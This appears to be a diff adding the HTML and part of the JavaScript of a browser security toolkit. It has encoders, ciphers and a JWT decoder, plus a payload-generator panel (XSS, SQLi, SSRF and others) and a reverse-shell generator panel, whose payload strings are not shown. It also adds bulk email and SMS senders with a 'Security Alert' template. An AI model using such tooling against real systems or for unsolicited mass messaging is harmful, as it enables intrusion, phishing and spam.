+  </div>
+  <div id="e-b64" class="tp on"><div class="card">
+    <textarea id="b64-i" placeholder="Enter text..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="b64E()">ENCODE</button><button class="btn bg sm" onclick="b64D()">DECODE</button></div>
+    <div class="term" id="b64-o" style="margin-top:7px"><span class="d">// Result here</span></div>
+  </div></div>
+  <div id="e-url" class="tp"><div class="card">
+    <textarea id="url-i" placeholder="Enter text..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="urlE()">ENCODE</button><button class="btn bg sm" onclick="urlD()">DECODE</button></div>
+    <div class="term" id="url-o" style="margin-top:7px"><span class="d">// Result here</span></div>
+  </div></div>
+  <div id="e-hex" class="tp"><div class="card">
+    <textarea id="hex-i" placeholder="Text or hex..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="hexE()">TEXT TO HEX</button><button class="btn bg sm" onclick="hexD()">HEX TO TEXT</button></div>
+    <div class="term" id="hex-o" style="margin-top:7px"><span class="d">// Result here</span></div>
+  </div></div>
+  <div id="e-bin" class="tp"><div class="card">
+    <textarea id="bin-i" placeholder="Text or binary..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="binE()">TEXT TO BIN</button><button class="btn bg sm" onclick="binD()">BIN TO TEXT</button></div>
+    <div class="term" id="bin-o" style="margin-top:7px"><span class="d">// Result here</span></div>
+  </div></div>
+  <div id="e-hash" class="tp"><div class="card">
+    <textarea id="hash-i" placeholder="Text to hash..." rows="3"></textarea>
+    <div class="row" style="margin-top:7px">
+      <button class="btn bp sm" onclick="doHash('SHA-1')">SHA-1</button>
+      <button class="btn bp sm" onclick="doHash('SHA-256')">SHA-256</button>
+      <button class="btn bp sm" onclick="doHash('SHA-384')">SHA-384</button>
+      <button class="btn bp sm" onclick="doHash('SHA-512')">SHA-512</button>
+    </div>
+    <div class="term" id="hash-o" style="margin-top:7px"><span class="d">// Result here</span></div>
+  </div></div>
+  <div id="e-html" class="tp"><div class="card">
+    <textarea id="htmle-i" placeholder="HTML or entities..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="htmleE()">ENCODE</button><button class="btn bg sm" onclick="htmleD()">DECODE</button></div>
+    <div class="term" id="htmle-o" style="margin-top:7px"><span class="d">// Result here</span></div>
+  </div></div>
+</div>
+
+<!-- CIPHER -->
+<div class="panel" id="p-cipher">
+  <div class="ptitle">&#9672; CIPHER TOOLS</div>
+  <div class="pdesc">Caesar, ROT13, Vigenere, Morse, Atbash</div>
+  <div class="tabs">
+    <div class="tab on" onclick="ctab('caesar',this)">Caesar</div>
+    <div class="tab" onclick="ctab('rot13',this)">ROT13</div>
+    <div class="tab" onclick="ctab('vig',this)">Vigenere</div>
+    <div class="tab" onclick="ctab('morse',this)">Morse</div>
+    <div class="tab" onclick="ctab('atbash',this)">Atbash</div>
+  </div>
+  <div id="c-caesar" class="tp on"><div class="card">
+    <div class="row"><label style="font-size:10px;color:var(--dim)">Shift:</label><input type="range" id="cs-s" min="1" max="25" value="13" oninput="document.getElementById('cs-sv').textContent=this.value"><span id="cs-sv" style="color:var(--cyan);min-width:22px;font-size:12px">13</span></div>
+    <textarea id="cs-i" placeholder="Input text..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="doCaesar(1)">ENCRYPT</button><button class="btn bg sm" onclick="doCaesar(-1)">DECRYPT</button></div>
+    <div class="term" id="cs-o" style="margin-top:7px"><span class="d">// Output here</span></div>
+  </div></div>
+  <div id="c-rot13" class="tp"><div class="card">
+    <textarea id="r13-i" placeholder="Input text..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="doROT13()">ROT13</button></div>
+    <div class="term" id="r13-o" style="margin-top:7px"><span class="d">// Output here</span></div>
+  </div></div>
+  <div id="c-vig" class="tp"><div class="card">
+    <div class="row"><input id="vig-k" placeholder="Key (e.g. SECRET)" style="max-width:200px" type="text"></div>
+    <textarea id="vig-i" placeholder="Input text..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="doVig(true)">ENCRYPT</button><button class="btn bg sm" onclick="doVig(false)">DECRYPT</button></div>
+    <div class="term" id="vig-o" style="margin-top:7px"><span class="d">// Output here</span></div>
+  </div></div>
+  <div id="c-morse" class="tp"><div class="card">
+    <textarea id="mo-i" placeholder="Text or morse (... --- ...)..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="doMorse(true)">TEXT TO MORSE</button><button class="btn bg sm" onclick="doMorse(false)">MORSE TO TEXT</button></div>
+    <div class="term" id="mo-o" style="margin-top:7px"><span class="d">// Output here</span></div>
+  </div></div>
+  <div id="c-atbash" class="tp"><div class="card">
+    <textarea id="ab-i" placeholder="Input text..."></textarea>
+    <div class="row" style="margin-top:7px"><button class="btn bp sm" onclick="doAtbash()">ATBASH</button></div>
+    <div class="term" id="ab-o" style="margin-top:7px"><span class="d">// Output here</span></div>
+  </div></div>
+</div>
+
+<!-- PAYLOADS -->
+<div class="panel" id="p-payloads">
+  <div class="ptitle">&#9672; PAYLOAD GENERATOR</div>
+  <div class="pdesc">XSS, SQLi, SSRF, XXE, SSTI, LFI test payloads</div>
+  <div class="disc"><strong style="color:var(--red)">AUTHORIZED TESTING ONLY.</strong> For CTF challenges and authorized penetration testing only.</div>
+  <div class="tabs">
+    <div class="tab on" onclick="ptab('xss',this)">XSS</div>
+    <div class="tab" onclick="ptab('sqli',this)">SQLi</div>
+    <div class="tab" onclick="ptab('ssrf',this)">SSRF</div>
+    <div class="tab" onclick="ptab('xxe',this)">XXE</div>
+    <div class="tab" onclick="ptab('ssti',this)">SSTI</div>
+    <div class="tab" onclick="ptab('lfi',this)">LFI</div>
+  </div>
+  <div id="pl-out"></div>
+</div>
+
+<!-- REV SHELL -->
+<div class="panel" id="p-revshell">
+  <div class="ptitle">&#9672; REVERSE SHELL GENERATOR</div>
+  <div class="pdesc">One-liner reverse shells for authorized pen testing</div>
+  <div class="disc"><strong style="color:var(--red)">AUTHORIZED USE ONLY.</strong> Only use on systems you own or have written permission to test.</div>
+  <div class="card">
+    <div class="row">
+      <input id="rs-ip" value="10.10.10.1" placeholder="LHOST" type="text">
+      <input id="rs-port" value="4444" placeholder="LPORT" style="max-width:80px" type="text">
+    </div>
+    <div class="sgrid" id="sg"></div>
+  </div>
+  <div class="card" id="so" style="display:none">
+    <div class="clabel" id="sol">Shell</div>
+    <div class="term" id="sout"></div>
+    <button class="btn bgh sm" onclick="copyShell()" style="margin-top:7px">COPY</button>
+  </div>
+</div>
+
+<!-- REGEX -->
+<div class="panel" id="p-regex">
+  <div class="ptitle">&#9672; REGEX TESTER</div>
+  <div class="pdesc">Live regex testing with match highlighting and presets</div>
+  <div class="card">
+    <div class="clabel">Pattern</div>
+    <div class="row">
+      <input id="rx-p" placeholder="e.g. \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" type="text" oninput="rxLive()">
+      <select id="rx-f" onchange="rxLive()"><option value="g">g</option><option value="gi">gi</option><option value="gm">gm</option><option value="gim">gim</option></select>
+    </div>
+    <textarea id="rx-t" rows="5" placeholder="Test string here..." oninput="rxLive()" style="width:100%;margin-bottom:8px"></textarea>
+    <div id="rx-r" style="font-size:11px"></div>
+    <div class="clabel" style="margin-top:12px">Common Patterns</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:5px">
+      <button class="btn bgh sm" onclick="rxSet('ipv4')">IPv4</button>
+      <button class="btn bgh sm" onclick="rxSet('email')">Email</button>
+      <button class="btn bgh sm" onclick="rxSet('url')">URL</button>
+      <button class="btn bgh sm" onclick="rxSet('mac')">MAC</button>
+      <button class="btn bgh sm" onclick="rxSet('domain')">Domain</button>
+      <button class="btn bgh sm" onclick="rxSet('md5')">MD5 Hash</button>
+      <button class="btn bgh sm" onclick="rxSet('jwt')">JWT Token</button>
+      <button class="btn bgh sm" onclick="rxSet('b64')">Base64</button>
+      <button class="btn bgh sm" onclick="rxSet('phone')">Phone</button>
+      <button class="btn bgh sm" onclick="rxSet('ipv6')">IPv6</button>
+    </div>
+  </div>
+</div>
+
+<!-- JWT -->
+<div class="panel" id="p-jwt">
+  <div class="ptitle">&#9672; JWT DECODER</div>
+  <div class="pdesc">Decode and analyze JSON Web Tokens — header, payload, expiry</div>
+  <div class="card">
+    <textarea id="jwt-i" rows="4" placeholder="Paste JWT token here..." style="width:100%;margin-bottom:9px" oninput="doJWT()"></textarea>
+    <div id="jwt-r"><span class="d" style="font-size:11px">// Paste JWT above to decode</span></div>
+  </div>
+</div>
+
+<!-- PASSWORDS -->
+<div class="panel" id="p-passwords">
+  <div class="ptitle">&#9672; PASSWORD GENERATOR</div>
+  <div class="pdesc">Cryptographically secure passwords and passphrases</div>
+  <div class="card">
+    <div class="clabel">Options</div>
+    <div class="row"><label style="font-size:10px;color:var(--dim)">Length:</label><input type="range" id="pw-l" min="8" max="128" value="24" oninput="document.getElementById('pw-lv').textContent=this.value;genPw()"><span id="pw-lv" style="color:var(--cyan);min-width:28px;font-size:12px">24</span></div>
+    <div class="row" style="gap:14px;font-size:11px;color:var(--text2)">
+      <label><input type="checkbox" id="pw-u" checked onchange="genPw()"> Upper</label>
+      <label><input type="checkbox" id="pw-lo" checked onchange="genPw()"> Lower</label>
+      <label><input type="checkbox" id="pw-n" checked onchange="genPw()"> Digits</label>
+      <label><input type="checkbox" id="pw-s" checked onchange="genPw()"> Symbols</label>
+    </div>
+    <button class="btn bp" onclick="genPw()" style="margin:7px 0">GENERATE</button>
+    <div class="term" id="pw-out" style="font-size:14px;letter-spacing:1px"><span class="d">// Click generate</span></div>
+    <div id="pw-str" style="margin-top:6px;font-size:10px"></div>
+  </div>
+  <div class="card">
+    <div class="clabel">Passphrase</div>
+    <div class="row">
+      <input type="number" id="wc" value="5" min="3" max="10" style="max-width:65px">
+      <select id="ws"><option value="-">Hyphens</option><option value=".">Dots</option><option value=" ">Spaces</option></select>
+      <button class="btn bp" onclick="genPhrase()">GENERATE PHRASE</button>
+    </div>
+    <div class="term" id="ph-out"><span class="d">// Click generate</span></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════
+     EMAIL MULTI-SENDER  (NEW in v4)
+     Uses EmailJS public API (free tier) OR mailto fallback
+═══════════════════════════════════════════════════════════ -->
+<div class="panel" id="p-emailsender">
+  <div class="ptitle">&#9672; EMAIL MULTI-SENDER</div>
+  <div class="pdesc">Send one message to multiple recipients — tabs for compose, recipients, settings &amp; log</div>
+  <div class="disc info">&#9432; This tool uses <strong>EmailJS</strong> (free) or your default mail client as fallback. For EmailJS: create a free account at emailjs.com, get your Service ID, Template ID &amp; Public Key and paste them in the <strong>Settings</strong> tab. Without credentials, the tool opens your mail client via mailto: links.</div>
+
+  <div class="tabs" id="esTabs">
+    <div class="tab on" onclick="esTab('compose',this)">&#9997; Compose</div>
+    <div class="tab" onclick="esTab('recipients',this)">&#128101; Recipients <span id="es-rcnt" class="badge bi" style="margin-left:4px">0</span></div>
+    <div class="tab" onclick="esTab('settings',this)">&#9881; Settings</div>
+    <div class="tab" onclick="esTab('log',this)">&#128203; Send Log <span id="es-lcnt" class="badge bi" style="margin-left:4px">0</span></div>
+  </div>
+
+  <!-- COMPOSE -->
+  <div id="es-compose" class="tp on">
+    <div class="card">
+      <div class="clabel">Message</div>
+      <div class="row">
+        <input id="es-from-name" placeholder="Your Name / Sender Name" type="text">
+        <input id="es-from-email" placeholder="your@email.com (reply-to)" type="email">
+      </div>
+      <div class="row">
+        <input id="es-subject" placeholder="Subject line..." type="text">
+      </div>
+      <div class="row">
+        <select id="es-mode">
+          <option value="plain">Plain Text</option>
+          <option value="html">HTML Body</option>
+          <option value="template">Template</option>
+        </select>
+        <select id="es-template" style="display:none" onchange="esLoadTemplate()">
+          <option value="">Select template...</option>
+          <option value="formal">Formal Outreach</option>
+          <option value="followup">Follow-Up</option>
+          <option value="alert">Security Alert</option>
+          <option value="newsletter">Newsletter</option>
+        </select>
+      </div>
+      <textarea id="es-body" rows="8" placeholder="Email body (plain text or HTML)..." style="width:100%"></textarea>
+      <div style="margin-top:8px;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+        <label style="font-size:10px;color:var(--dim)"><input type="checkbox" id="es-personalize" style="margin-right:4px"> Personalize (replace {{name}} with recipient name)</label>
+        <label style="font-size:10px;color:var(--dim)"><input type="checkbox" id="es-delay-check" style="margin-right:4px"> Delay between sends</label>
+        <input id="es-delay" type="number" value="2" min="0" max="30" style="max-width:55px;display:none"> <span id="es-delay-lbl" style="font-size:10px;color:var(--dim);display:none">sec</span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="clabel">Send</div>
+      <div id="es-sendinfo" style="font-size:11px;color:var(--dim);margin-bottom:10px">No recipients added yet. Go to <strong style="color:var(--cyan)">Recipients</strong> tab to add.</div>
+      <div class="statrow" id="es-stats">
+        <div class="statbox"><div class="sv" id="es-st-total" style="color:var(--cyan)">0</div><div class="sk">TOTAL</div></div>
+        <div class="statbox"><div class="sv" id="es-st-sent" style="color:var(--grn)">0</div><div class="sk">SENT</div></div>
+        <div class="statbox"><div class="sv" id="es-st-fail" style="color:var(--red)">0</div><div class="sk">FAILED</div></div>
+        <div class="statbox"><div class="sv" id="es-st-pend" style="color:var(--orn)">0</div><div class="sk">PENDING</div></div>
+      </div>
+      <div class="prog" id="es-prog-wrap"><div class="pf" id="es-prog" style="width:0%"></div></div>
+      <div class="row" style="margin-top:10px">
+        <button class="btn bp" onclick="esSendAll()">&#9654; SEND TO ALL</button>
+        <button class="btn bw sm" onclick="esSendTest()">&#9993; TEST SEND (1)</button>
+        <button class="btn br sm" onclick="esReset()">&#8635; RESET</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- RECIPIENTS -->
+  <div id="es-recipients" class="tp">
+    <div class="card">
+      <div class="clabel">Add Recipients</div>
+      <div class="tabs" style="margin-bottom:10px">
+        <div class="tab on" onclick="esRecipTab('single',this)">Single</div>
+        <div class="tab" onclick="esRecipTab('bulk',this)">Bulk Import</div>
+        <div class="tab" onclick="esRecipTab('csv',this)">CSV</div>
+      </div>
+
+      <div id="es-r-single" class="tp on">
+        <div class="row">
+          <input id="es-r-email" placeholder="email@example.com" type="email">
+          <input id="es-r-name" placeholder="Display Name (optional)" type="text">
+          <button class="btn bp sm" onclick="esAddRecip()">ADD</button>
+        </div>
+      </div>
+
+      <div id="es-r-bulk" class="tp">
+        <textarea id="es-r-bulk-ta" rows="5" placeholder="One email per line, or: Name &lt;email@example.com&gt;&#10;Another &lt;other@example.com&gt;" style="width:100%"></textarea>
+        <button class="btn bp sm" onclick="esImportBulk()" style="margin-top:7px">IMPORT ALL</button>
+      </div>
+
+      <div id="es-r-csv" class="tp">
+        <div style="font-size:11px;color:var(--dim);margin-bottom:8px">CSV format: <span class="c">email,name</span> (one per line, header row optional)</div>
+        <textarea id="es-r-csv-ta" rows="5" placeholder="email,name&#10;alice@example.com,Alice&#10;bob@example.com,Bob" style="width:100%"></textarea>
+        <button class="btn bp sm" onclick="esImportCSV()" style="margin-top:7px">IMPORT CSV</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="clabel" style="margin-bottom:6px">Recipient List <span id="es-rcnt2" class="badge bi" style="margin-left:4px">0</span> <button class="btn br sm" onclick="esClearRecips()" style="margin-left:auto;margin-right:0;float:right">CLEAR ALL</button></div>
+      <div class="recip-list" id="es-rlist"><span class="d" style="font-size:11px;padding:4px">No recipients yet</span></div>
+      <div style="font-size:10px;color:var(--dim);margin-top:6px">Click a recipient to remove them</div>
+    </div>
+  </div>
+
+  <!-- SETTINGS -->
+  <div id="es-settings" class="tp">
+    <div class="card">
+      <div class="clabel">EmailJS Credentials</div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:10px;line-height:1.6">
+        Get free credentials at <span class="c">emailjs.com</span> → Create account → Add Email Service → Create Template → Copy keys below.<br>
+        Template variables available: <span class="c">{{to_email}}, {{to_name}}, {{from_name}}, {{from_email}}, {{subject}}, {{message}}</span>
+      </div>
+      <div class="row">
+        <input id="ejs-service" placeholder="Service ID (e.g. service_abc123)" type="text">
+      </div>
+      <div class="row">
+        <input id="ejs-template" placeholder="Template ID (e.g. template_xyz789)" type="text">
+      </div>
+      <div class="row">
+        <input id="ejs-pubkey" placeholder="Public Key (e.g. user_ABC...)" type="text">
+      </div>
+      <div class="row">
+        <button class="btn bp sm" onclick="ejsSave()">SAVE CREDENTIALS</button>
+        <button class="btn bg sm" onclick="ejsTest()">TEST CONNECTION</button>
+        <button class="btn br sm" onclick="ejsClear()">CLEAR</button>
+      </div>
+      <div id="ejs-status" style="font-size:11px;margin-top:7px"></div>
+    </div>
+    <div class="card">
+      <div class="clabel">Send Mode</div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:10px;line-height:1.7">
+        <div>&#9679; <strong style="color:var(--cyan)">EmailJS</strong> — Sends emails from browser via EmailJS API. Requires credentials above.</div>
+        <div>&#9679; <strong style="color:var(--grn)">Mailto Fallback</strong> — Opens your mail client for each recipient. No API needed. Good for small lists.</div>
+      </div>
+      <div class="row">
+        <select id="ejs-sendmode">
+          <option value="emailjs">EmailJS (API)</option>
+          <option value="mailto">Mailto (Mail Client)</option>
+        </select>
+        <button class="btn bp sm" onclick="ejsSaveMode()">SET MODE</button>
+      </div>
+      <div id="ejs-mode-status" style="font-size:10px;color:var(--dim);margin-top:6px"></div>
+    </div>
+  </div>
+
+  <!-- LOG -->
+  <div id="es-log" class="tp">
+    <div class="card">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+        <div class="clabel" style="margin-bottom:0">Send Log</div>
+        <button class="btn br sm" onclick="esClearLog()">CLEAR LOG</button>
+      </div>
+      <div id="es-logbody" style="max-height:400px;overflow-y:auto"><span class="d" style="font-size:11px">No activity yet</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════
+     PHONE MULTI-SENDER  (NEW in v4)
+     Uses Twilio REST API (user supplies creds) OR tel: fallback
+═══════════════════════════════════════════════════════════ -->
+<div class="panel" id="p-phonesender">
+  <div class="ptitle">&#9672; PHONE MULTI-SENDER</div>
+  <div class="pdesc">Send SMS/text to multiple phone numbers — compose, recipients, settings &amp; log</div>
+  <div class="disc"><strong style="color:var(--red)">LEGAL USE ONLY.</strong> You must have explicit consent from all recipients. Unsolicited SMS is illegal in most jurisdictions (CAN-SPAM, TCPA, GDPR). Use only for authorized notifications.</div>
+
+  <div class="tabs" id="psTabs">
+    <div class="tab on" onclick="psTab('compose',this)">&#9997; Compose</div>
+    <div class="tab" onclick="psTab('recipients',this)">&#128101; Recipients <span id="ps-rcnt" class="badge bi" style="margin-left:4px">0</span></div>
+    <div class="tab" onclick="psTab('settings',this)">&#9881; Settings</div>
+    <div class="tab" onclick="psTab('log',this)">&#128203; Send Log <span id="ps-lcnt" class="badge bi" style="margin-left:4px">0</span></div>
+  </div>
+
+  <!-- COMPOSE -->
+  <div id="ps-compose" class="tp on">
+    <div class="card">
+      <div class="clabel">Message</div>
+      <div class="row">
+        <select id="ps-type">
+          <option value="sms">SMS (plain text)</option>
+          <option value="mms">MMS (with media URL)</option>
+        </select>
+      </div>
+      <div id="ps-mms-row" style="display:none" class="row">
+        <input id="ps-media-url" placeholder="Media URL for MMS (https://...)" type="url">
+      </div>
+      <textarea id="ps-body" rows="5" placeholder="Message text (max 160 chars for single SMS)..." style="width:100%" oninput="psCountChars()"></textarea>
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-top:5px">
+        <div id="ps-charcount" style="font-size:10px;color:var(--dim)">0 / 160</div>
+        <div id="ps-segcount" style="font-size:10px;color:var(--orn)"></div>
+      </div>
+      <div style="margin-top:8px;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
+        <label style="font-size:10px;color:var(--dim)"><input type="checkbox" id="ps-personalize" style="margin-right:4px"> Personalize (replace {{name}} with contact name)</label>
+        <label style="font-size:10px;color:var(--dim)"><input type="checkbox" id="ps-delay-check" style="margin-right:4px"> Delay between sends</label>
+        <input id="ps-delay" type="number" value="1" min="0" max="30" style="max-width:55px;display:none"> <span id="ps-delay-lbl" style="font-size:10px;color:var(--dim);display:none">sec</span>
+      </div>
+      <div style="margin-top:8px">
+        <div class="clabel">Quick Templates</div>
+        <div style="display:flex;flex-wrap:wrap;gap:5px;margin-top:5px">
+          <button class="btn bgh sm" onclick="psTemplate('alert')">&#9888; Alert</button>
+          <button class="btn bgh sm" onclick="psTemplate('reminder')">&#128276; Reminder</button>
+          <button class="btn bgh sm" onclick="psTemplate('confirm')">&#10003; Confirmation</button>
+          <button class="btn bgh sm" onclick="psTemplate('otp')">&#128272; OTP</button>
+          <button class="btn bgh sm" onclick="psTemplate('promo')">&#127381; Promo</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="clabel">Send</div>
+      <div id="ps-sendinfo" style="font-size:11px;color:var(--dim);margin-bottom:10px">No recipients added yet. Go to <strong style="color:var(--cyan)">Recipients</strong> tab to add.</div>
+      <div class="statrow" id="ps-stats">
+        <div class="statbox"><div class="sv" id="ps-st-total" style="color:var(--cyan)">0</div><div class="sk">TOTAL</div></div>
+        <div class="statbox"><div class="sv" id="ps-st-sent" style="color:var(--grn)">0</div><div class="sk">SENT</div></div>
+        <div class="statbox"><div class="sv" id="ps-st-fail" style="color:var(--red)">0</div><div class="sk">FAILED</div></div>
+        <div class="statbox"><div class="sv" id="ps-st-pend" style="color:var(--orn)">0</div><div class="sk">PENDING</div></div>
+      </div>
+      <div class="prog"><div class="pf" id="ps-prog" style="width:0%"></div></div>
+      <div class="row" style="margin-top:10px">
+        <button class="btn bp" onclick="psSendAll()">&#9654; SEND TO ALL</button>
+        <button class="btn bw sm" onclick="psSendTest()">&#128241; TEST SEND (1)</button>
+        <button class="btn br sm" onclick="psReset()">&#8635; RESET</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- RECIPIENTS -->
+  <div id="ps-recipients" class="tp">
+    <div class="card">
+      <div class="clabel">Add Numbers</div>
+      <div class="tabs" style="margin-bottom:10px">
+        <div class="tab on" onclick="psRecipTab('single',this)">Single</div>
+        <div class="tab" onclick="psRecipTab('bulk',this)">Bulk Import</div>
+        <div class="tab" onclick="psRecipTab('csv',this)">CSV</div>
+      </div>
+
+      <div id="ps-r-single" class="tp on">
+        <div class="row">
+          <input id="ps-r-num" placeholder="+1 555 000 0000 (E.164 format)" type="tel">
+          <input id="ps-r-name" placeholder="Contact Name (optional)" type="text">
+          <button class="btn bp sm" onclick="psAddRecip()">ADD</button>
+        </div>
+        <div style="font-size:10px;color:var(--dim);margin-top:4px">Use E.164 format: +[country code][number] e.g. +12125551234</div>
+      </div>
+
+      <div id="ps-r-bulk" class="tp">
+        <textarea id="ps-r-bulk-ta" rows="5" placeholder="One number per line (E.164 format):&#10;+12125551234&#10;+442012345678&#10;Name: +12125559876" style="width:100%"></textarea>
+        <button class="btn bp sm" onclick="psImportBulk()" style="margin-top:7px">IMPORT ALL</button>
+      </div>
+
+      <div id="ps-r-csv" class="tp">
+        <div style="font-size:11px;color:var(--dim);margin-bottom:8px">CSV format: <span class="c">phone,name</span> (one per line, header optional)</div>
+        <textarea id="ps-r-csv-ta" rows="5" placeholder="phone,name&#10;+12125551234,Alice&#10;+442012345678,Bob" style="width:100%"></textarea>
+        <button class="btn bp sm" onclick="psImportCSV()" style="margin-top:7px">IMPORT CSV</button>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="clabel" style="margin-bottom:6px">Contact List <span id="ps-rcnt2" class="badge bi" style="margin-left:4px">0</span> <button class="btn br sm" onclick="psClearRecips()" style="margin-left:auto;float:right">CLEAR ALL</button></div>
+      <div class="recip-list" id="ps-rlist"><span class="d" style="font-size:11px;padding:4px">No contacts yet</span></div>
+      <div style="font-size:10px;color:var(--dim);margin-top:6px">Click a contact to remove</div>
+    </div>
+  </div>
+
+  <!-- SETTINGS -->
+  <div id="ps-settings" class="tp">
+    <div class="card">
+      <div class="clabel">Twilio Credentials</div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:10px;line-height:1.6">
+        Get free trial at <span class="c">twilio.com</span> → Sign up → Get Account SID, Auth Token &amp; a Twilio phone number.<br>
+        <strong style="color:var(--orn)">&#9888; Note:</strong> For security, Twilio API calls from a browser require a backend proxy. This tool provides direct API calling for testing — for production use a server-side integration.
+      </div>
+      <div class="row">
+        <input id="tw-sid" placeholder="Account SID (ACxxxxxxxxxxxxxxx)" type="text">
+      </div>
+      <div class="row">
+        <input id="tw-token" placeholder="Auth Token" type="password">
+        <button class="btn bgh sm" onclick="twToggleToken()">SHOW</button>
+      </div>
+      <div class="row">
+        <input id="tw-from" placeholder="From Number (+12125550000)" type="tel">
+      </div>
+      <div class="row">
+        <button class="btn bp sm" onclick="twSave()">SAVE CREDENTIALS</button>
+        <button class="btn bg sm" onclick="twTest()">TEST CONNECTION</button>
+        <button class="btn br sm" onclick="twClear()">CLEAR</button>
+      </div>
+      <div id="tw-status" style="font-size:11px;margin-top:7px"></div>
+    </div>
+    <div class="card">
+      <div class="clabel">Send Mode</div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:10px;line-height:1.7">
+        <div>&#9679; <strong style="color:var(--cyan)">Twilio API</strong> — Sends SMS via Twilio REST API. Requires credentials. Costs per message.</div>
+        <div>&#9679; <strong style="color:var(--grn)">Tel: Fallback</strong> — Opens phone dialer / SMS app for each number. No API needed.</div>
+        <div>&#9679; <strong style="color:var(--orn)">Simulation</strong> — Simulates sends without making real API calls. For testing UI only.</div>
+      </div>
+      <div class="row">
+        <select id="tw-sendmode">
+          <option value="twilio">Twilio API</option>
+          <option value="tel">Tel: Fallback</option>
+          <option value="simulate">Simulation Mode</option>
+        </select>
+        <button class="btn bp sm" onclick="twSaveMode()">SET MODE</button>
+      </div>
+      <div id="tw-mode-status" style="font-size:10px;color:var(--dim);margin-top:6px"></div>
+    </div>
+  </div>
+
+  <!-- LOG -->
+  <div id="ps-log" class="tp">
+    <div class="card">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+        <div class="clabel" style="margin-bottom:0">Send Log</div>
+        <button class="btn br sm" onclick="psClearLog()">CLEAR LOG</button>
+      </div>
+      <div id="ps-logbody" style="max-height:400px;overflow-y:auto"><span class="d" style="font-size:11px">No activity yet</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- MY INFO -->
+<div class="panel" id="p-myinfo">
+  <div class="ptitle">&#9672; MY NETWORK INFO</div>
+  <div class="pdesc">Your public IP, geo, ISP, and browser details</div>
+  <div class="card">
+    <button class="btn bp" onclick="loadMyInfo()">REFRESH</button>
+    <div id="mi-r" style="margin-top:10px"><span class="d" style="font-size:11px">// Click refresh</span></div>
+  </div>
+  <div class="card">
+    <div class="clabel">Browser / Platform</div>
+    <div id="mi-b" class="rg"></div>
+  </div>
+</div>
+
+<!-- WEBRTC -->
+<div class="panel" id="p-webrtc">
+  <div class="ptitle">&#9672; WEBRTC LEAK TEST</div>
+  <div class="pdesc">Detect if WebRTC exposes your real IP behind a VPN</div>
+  <div class="card">
+    <button class="btn bp" onclick="doWebRTC()">RUN LEAK TEST</button>
+    <div id="wr-r" style="margin-top:12px"><span class="d" style="font-size:11px">// Click to run test</span></div>
+  </div>
+</div>
+
+</div><!-- #main -->
+</div><!-- #body -->
+
+<script>
+(function(){
+'use strict';
+
+// ── helpers ──────────────────────────────────────────────
+function G(id){return document.getElementById(id);}
+function tset(id,html){var el=G(id);if(el)el.innerHTML=html;}
+function tadd(id,html){var el=G(id);if(el){el.innerHTML+=html+'\n';el.scrollTop=9999;}}
+function rcell(label,val){var d=document.createElement('div');d.className='rc';d.innerHTML='<div class="rl">'+label+'</div><div class="rv">'+(val||'—')+'</div>';return d;}
+function rgrid(fields){var g=document.createElement('div');g.className='rg';Object.entries(fields).forEach(function(kv){g.appendChild(rcell(kv[0],kv[1]||'—'));});return g;}
+
+// ── clock ────────────────────────────────────────────────
+function tick(){G('hclock').textContent=new Date().toISOString().slice(11,19)+' UTC';}
+setInterval(tick,1000);tick();
+
+// ── ticker ───────────────────────────────────────────────
+G('ttrack').textContent=[
+  '▶ CRITICAL: Apache HTTP Server RCE CVE-2025-1938 actively exploited',
+  '▶ Iran APT42 PhantomMail spearphishing campaign hits US defense contractors',
+  '▶ US CYBERCOM confirms offensive ops against IRGC networks',
+  '▶ Volt Typhoon re-emerges in 6 US critical infrastructure networks',
+  '▶ CISA KEV update: Ivanti, Cisco, Fortinet — patch immediately',
+  '▶ Salt Typhoon: 9 US carriers breached, wiretap systems accessed',
+  '▶ AI deepfake CEO voice used in $25M wire fraud — UK firm',
+  '▶ NetHawk v4 — Email & Phone Multi-Sender now available'
+].join('    ···    ');
+
+// ── nav ──────────────────────────────────────────────────
+function go(id,el){
+  document.querySelectorAll('.panel').forEach(function(p){p.classList.remove('on');});
+  document.querySelectorAll('.ni').forEach(function(n){n.classList.remove('on');});
+  var panel=G('p-'+id);if(!panel)return;
+  panel.classList.add('on');
+  if(el)el.classList.add('on');
+  if(id==='cve')buildCVE();
+  if(id==='threatmap')initMap();
+  if(id==='dashboard')animDash();
+  if(id==='subnet')buildCIDRRef();
+  if(id==='passwords')genPw();
+  if(id==='revshell')buildShellGrid();
+  if(id==='payloads')showPayloads('xss');
+}
+window.go=go;
+
+// ── dashboard ─────────────────────────────────────────────
+function animDash(){
+  var n=0,el=G('d-attacks');if(!el)return;
+  var t=setInterval(function(){n+=43;el.textContent=n.toLocaleString();if(n>=2847){el.textContent='2,847';clearInterval(t);}},20);
+}
+
